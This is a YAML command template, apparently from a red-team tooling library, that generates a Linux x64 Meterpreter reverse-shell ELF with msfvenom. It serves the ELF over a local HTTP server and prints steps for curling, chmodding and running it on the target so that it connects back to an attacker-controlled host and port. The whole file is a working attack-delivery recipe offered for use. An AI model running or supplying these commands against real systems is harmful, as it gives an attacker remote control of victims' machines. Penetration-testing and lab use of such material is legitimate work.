---
metadata:
  filename: "deliver-linux-x64-revshell-msfvenom-meterpreter-tcp-nonstaged-elf.yaml"
  tags: ["shell", "linux"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/outbound; \
  printf '%s\n' 'msfvenom creates the payload. Please wait...'; \
  msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f elf > packstation/outbound/revshell.elf ; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      ------Listener------                      '; \
  printf '%s\n' '1. Start listener: {{ include('scripts/listener-msf-multi-handler-linux-x64-meterpreter-tcp-nonstaged.yaml') }}'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                       -----Linux------                         '; \
  printf '%s\n' '2. Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.elf -o {{ delivery_path_linux }}/revshell.elf'; \
  printf '%s\n' '3. Make executable: chmod +x {{ delivery_path_linux }}/revshell.elf'; \
  printf '%s\n' '4. Execute: {{ delivery_path_linux }}/revshell.elf'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
